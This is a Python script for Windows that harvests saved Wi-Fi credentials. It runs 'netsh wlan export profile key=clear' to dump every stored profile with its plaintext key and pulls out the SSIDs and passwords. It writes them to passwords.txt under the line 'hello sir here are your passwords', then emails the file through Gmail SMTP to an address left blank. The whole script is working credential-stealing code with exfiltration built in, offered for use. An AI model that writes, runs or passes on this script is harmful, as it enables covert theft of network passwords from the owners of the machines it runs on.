import subprocess
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Function to collect Wi-Fi information
def collect_wifi_info():
    wifi_files = []
    wifi_names = []
    wifi_passwords = []

    # Use subprocess
    command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

    # Grab the current directory
    path = os.getcwd()

    # Do the hacks using a for loop
    for filename in os.listdir(path):
        if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
            wifi_files.append(filename)
            for i in wifi_files:
                with open(i, 'r') as f:
                    for line in f.readlines():
                        if 'name' in line:
                            stripped = line.strip()
                            front = stripped[6:]
                            back = front[:-7]
                            wifi_names.append(back)
                        if 'keyMaterial' in line:
                            stripped = line.strip()
                            front = stripped[13:]
                            back = front[:-14]
                            wifi_passwords.append(back)

    return wifi_names, wifi_passwords

# Create a file
password_file = open('passwords.txt', "w")
password_file.write("hello sir here are your passwords:\n\n")
password_file.close()

# Collect Wi-Fi information
wifi_names, wifi_passwords = collect_wifi_info()

# Write SSID and passwords to passwords.txt
with open("passwords.txt", "a") as password_file:
    for x, y in zip(wifi_names, wifi_passwords):
        password_file.write("SSID: " + x + "\nPassword: " + y + "\n\n")

# Email Configuration
SENDER_EMAIL = ""
SENDER_PASSWD = ""
RECIEVER_EMAIL = ""
Subject = ""
email_text = ""  # Add your email text

# Create the MIMEMultipart object
message = MIMEMultipart()
message['From'] = SENDER_EMAIL
message['To'] = RECIEVER_EMAIL
message['Subject'] = Subject

# Attach email text
message.attach(MIMEText(email_text, 'plain'))

# Attach 'password.txt'
filename = 'passwords.txt'
try:
    with open(filename, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={filename}')
        message.attach(part)
except FileNotFoundError:
    print(f"Attachment file '{filename}' not found.")

# Connect to Gmail SMTP server
with smtplib.SMTP("smtp.gmail.com", 587) as session:
    session.starttls()
    
    try:
        # Login to your Gmail account
        session.login(SENDER_EMAIL, SENDER_PASSWD)
        
        # Send the email
        session.sendmail(SENDER_EMAIL, RECIEVER_EMAIL, message.as_string())
        
        print("Email sent successfully.")
    except smtplib.SMTPAuthenticationError:
        print("Authentication failed. Check your email and password.")
    except Exception as e:
        print(f"An error occurred: {e}")
